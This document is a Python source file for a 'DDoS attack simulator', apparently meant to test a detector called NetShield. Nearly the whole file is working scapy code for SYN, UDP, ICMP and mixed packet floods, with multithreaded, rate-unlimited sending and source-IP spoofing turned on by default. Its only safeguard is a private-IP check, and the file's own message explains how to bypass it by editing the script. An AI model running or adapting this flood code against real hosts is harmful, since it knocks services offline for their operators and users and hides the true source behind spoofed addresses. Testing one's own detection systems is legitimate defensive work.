"""
DDoS Attack Simulator — Local Testing Only
==========================================
Simulates various DDoS attack types to verify that NetShield detects them.

WARNING: Only use this against your own machines on your own network.
         Using this against any external IP is illegal.

Usage:
    sudo python simulator.py --target 127.0.0.1 --attack syn
    sudo python simulator.py --target 192.168.1.100 --attack udp --rate 2000
    sudo python simulator.py --target 192.168.1.100 --attack mixed --threads 4 --duration 60
    sudo python simulator.py --target 192.168.1.100 --attack icmp --count 5000

Attack types:
    syn    — TCP SYN flood (high SYN, near-zero ACK — primary model target)
    udp    — UDP flood (volumetric, large payloads)
    icmp   — ICMP echo flood (ping flood)
    mixed  — Alternates SYN and UDP bursts for combined stress testing

Requirements:
    pip install scapy
"""

import argparse
import os
import random
import signal
import sys
import threading
import time
from dataclasses import dataclass, field


# ─────────────────────────────────────────────────────────────────────────────
# SHARED STATE
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Stats:
    sent:      int   = 0
    bytes_out: int   = 0
    start:     float = field(default_factory=time.monotonic)
    _lock: threading.Lock = field(default_factory=threading.Lock, repr=False, compare=False)

    def add(self, pkts: int, nbytes: int):
        with self._lock:
            self.sent      += pkts
            self.bytes_out += nbytes

    def snapshot(self):
        with self._lock:
            elapsed = max(time.monotonic() - self.start, 0.001)
            return self.sent, self.bytes_out, elapsed


_stop = threading.Event()


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def _is_private(ip: str) -> bool:
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        a, b = int(parts[0]), int(parts[1])
    except ValueError:
        return False
    return (
        a == 10 or
        a == 127 or
        (a == 172 and 16 <= b <= 31) or
        (a == 192 and b == 168) or
        (a == 169 and b == 254)
    )


def random_public_ip() -> str:
    while True:
        ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if not _is_private(ip):
            return ip


def random_port() -> int:
    return random.randint(1024, 65535)


def _throttle(rate_per_thread: float, last_tick: float) -> float:
    """Sleep as needed to honour the per-thread packet rate. Returns new last_tick."""
    if rate_per_thread <= 0:
        return last_tick
    interval = 1.0 / rate_per_thread
    now      = time.monotonic()
    gap      = interval - (now - last_tick)
    if gap > 0:
        time.sleep(gap)
    return time.monotonic()


def _progress(stats: Stats, attack: str, target: str, count_limit: int):
    """Single-line live stats printed to stdout every 0.5s."""
    while not _stop.is_set():
        sent, nbytes, elapsed = stats.snapshot()
        pps  = sent  / elapsed
        mbps = (nbytes * 8) / (elapsed * 1e6)
        limit_str = f"/{count_limit:,}" if count_limit else ""
        sys.stdout.write(
            f"\r  [{attack.upper()}] → {target} | "
            f"{sent:>8,}{limit_str} pkts | "
            f"{pps:>7,.0f} pkt/s | "
            f"{mbps:>6.2f} Mbps | "
            f"{elapsed:>5.1f}s    "
        )
        sys.stdout.flush()
        time.sleep(0.5)
    sys.stdout.write("\n")


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK WORKERS
# ─────────────────────────────────────────────────────────────────────────────

def _syn_worker(target_ip: str, target_port: int, rate: float, count_limit: int,
                stats: Stats, spoof: bool):
    from scapy.all import IP, TCP, send, conf
    conf.verb = 0
    last = time.monotonic()
    sent = 0

    while not _stop.is_set():
        if count_limit and stats.sent >= count_limit:
            _stop.set(); break

        src_ip   = random_public_ip() if spoof else "127.0.0.1"
        src_port = random_port()
        pkt = (
            IP(src=src_ip, dst=target_ip) /
            TCP(sport=src_port, dport=target_port, flags="S",
                seq=random.randint(0, 2**32 - 1),
                window=random.randint(512, 65535))
        )
        send(pkt, verbose=False)
        pkt_bytes = len(pkt)
        stats.add(1, pkt_bytes)
        sent += 1
        last = _throttle(rate, last)


def _udp_worker(target_ip: str, target_port: int, rate: float, count_limit: int,
                stats: Stats, spoof: bool, payload_size: int):
    from scapy.all import IP, UDP, Raw, send, conf
    conf.verb = 0
    last = time.monotonic()

    while not _stop.is_set():
        if count_limit and stats.sent >= count_limit:
            _stop.set(); break

        src_ip   = random_public_ip() if spoof else "127.0.0.1"
        src_port = random_port()
        payload  = random.randbytes(payload_size)
        pkt = (
            IP(src=src_ip, dst=target_ip) /
            UDP(sport=src_port, dport=target_port) /
            Raw(load=payload)
        )
        send(pkt, verbose=False)
        stats.add(1, len(pkt))
        last = _throttle(rate, last)


def _icmp_worker(target_ip: str, rate: float, count_limit: int,
                 stats: Stats, spoof: bool):
    from scapy.all import IP, ICMP, Raw, send, conf
    conf.verb = 0
    last = time.monotonic()

    while not _stop.is_set():
        if count_limit and stats.sent >= count_limit:
            _stop.set(); break

        src_ip  = random_public_ip() if spoof else "127.0.0.1"
        payload = random.randbytes(random.randint(32, 256))
        pkt = (
            IP(src=src_ip, dst=target_ip) /
            ICMP(type=8, code=0, id=random.randint(0, 65535)) /
            Raw(load=payload)
        )
        send(pkt, verbose=False)
        stats.add(1, len(pkt))
        last = _throttle(rate, last)


def _mixed_worker(target_ip: str, target_port: int, rate: float, count_limit: int,
                  stats: Stats, spoof: bool, payload_size: int):
    """Alternates SYN and UDP bursts every 50 packets — mimics a blended attack."""
    from scapy.all import IP, TCP, UDP, Raw, send, conf
    conf.verb = 0
    last  = time.monotonic()
    burst = 0

    while not _stop.is_set():
        if count_limit and stats.sent >= count_limit:
            _stop.set(); break

        src_ip   = random_public_ip() if spoof else "127.0.0.1"
        src_port = random_port()

        if (burst // 50) % 2 == 0:
            pkt = (
                IP(src=src_ip, dst=target_ip) /
                TCP(sport=src_port, dport=target_port, flags="S",
                    seq=random.randint(0, 2**32 - 1))
            )
        else:
            pkt = (
                IP(src=src_ip, dst=target_ip) /
                UDP(sport=src_port, dport=target_port) /
                Raw(load=random.randbytes(payload_size))
            )

        send(pkt, verbose=False)
        stats.add(1, len(pkt))
        burst += 1
        last = _throttle(rate, last)


# ─────────────────────────────────────────────────────────────────────────────
# LAUNCHER
# ─────────────────────────────────────────────────────────────────────────────

def launch(attack: str, target_ip: str, target_port: int, duration: int,
           rate: int, threads: int, count: int, spoof: bool, payload_size: int):

    per_thread_rate = (rate / threads) if rate > 0 else 0
    stats = Stats()

    WORKER_MAP = {
        "syn":   lambda: _syn_worker(target_ip, target_port, per_thread_rate, count, stats, spoof),
        "udp":   lambda: _udp_worker(target_ip, target_port, per_thread_rate, count, stats, spoof, payload_size),
        "icmp":  lambda: _icmp_worker(target_ip, per_thread_rate, count, stats, spoof),
        "mixed": lambda: _mixed_worker(target_ip, target_port, per_thread_rate, count, stats, spoof, payload_size),
    }

    rate_str  = f"{rate:,} pkt/s" if rate > 0 else "unlimited"
    stop_str  = f"{count:,} packets" if count else f"{duration}s"
    spoof_str = "yes (random public IPs)" if spoof else "no (use real source)"

    print(f"\n  Attack  : {attack.upper()}")
    print(f"  Target  : {target_ip}:{target_port}")
    print(f"  Rate    : {rate_str} across {threads} thread(s)")
    print(f"  Stop    : {stop_str}")
    print(f"  Spoofed : {spoof_str}")
    print(f"\n  Press Ctrl+C to stop early.\n")

    # Start attack threads
    workers = [threading.Thread(target=WORKER_MAP[attack], daemon=True) for _ in range(threads)]
    for w in workers:
        w.start()

    # Start live stats thread
    prog = threading.Thread(target=_progress, args=(stats, attack, target_ip, count), daemon=True)
    prog.start()

    # Wait for duration or count limit
    deadline = time.monotonic() + duration
    while not _stop.is_set():
        if time.monotonic() >= deadline:
            _stop.set()
            break
        time.sleep(0.1)

    for w in workers:
        w.join(timeout=2)
    prog.join(timeout=1)

    sent, nbytes, elapsed = stats.snapshot()
    print(f"\n  Done — {sent:,} packets | {nbytes / 1024:.1f} KB | {sent / elapsed:.0f} pkt/s avg | {elapsed:.1f}s\n")


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="NetShield DDoS simulator — local testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("--target",       required=True,  help="Target IP (must be your own machine)")
    parser.add_argument("--attack",       required=True,  choices=["syn", "udp", "icmp", "mixed"], help="Attack type")
    parser.add_argument("--port",         type=int,   default=80,    help="Target port (default: 80)")
    parser.add_argument("--duration",     type=int,   default=30,    help="Duration in seconds (default: 30)")
    parser.add_argument("--rate",         type=int,   default=0,     help="Max packets/s across all threads (default: unlimited)")
    parser.add_argument("--threads",      type=int,   default=1,     help="Parallel sending threads (default: 1)")
    parser.add_argument("--count",        type=int,   default=0,     help="Stop after N packets instead of --duration")
    parser.add_argument("--payload-size", type=int,   default=512,   help="UDP/ICMP payload bytes (default: 512)")
    parser.add_argument("--no-spoof",     action="store_true",       help="Don't spoof source IPs (use real source)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] Root required to send raw packets.")
        print("    Run with: sudo python simulator.py --target <ip> --attack <type>")
        sys.exit(1)

    if not _is_private(args.target) and args.target not in ("localhost", "127.0.0.1"):
        print(f"[!] '{args.target}' is not a private/local IP.")
        print("    This tool is for local testing only.")
        print("    If this is intentional, edit the safety check in the script.")
        sys.exit(1)

    if args.threads < 1:
        print("[!] --threads must be >= 1"); sys.exit(1)
    if args.rate < 0:
        print("[!] --rate must be >= 0 (0 = unlimited)"); sys.exit(1)

    signal.signal(signal.SIGINT, lambda s, f: (_stop.set(), print("\n[*] Interrupted.")))

    launch(
        attack       = args.attack,
        target_ip    = args.target,
        target_port  = args.port,
        duration     = args.duration,
        rate         = args.rate,
        threads      = args.threads,
        count        = args.count,
        spoof        = not args.no_spoof,
        payload_size = args.payload_size,
    )


if __name__ == "__main__":
    main()
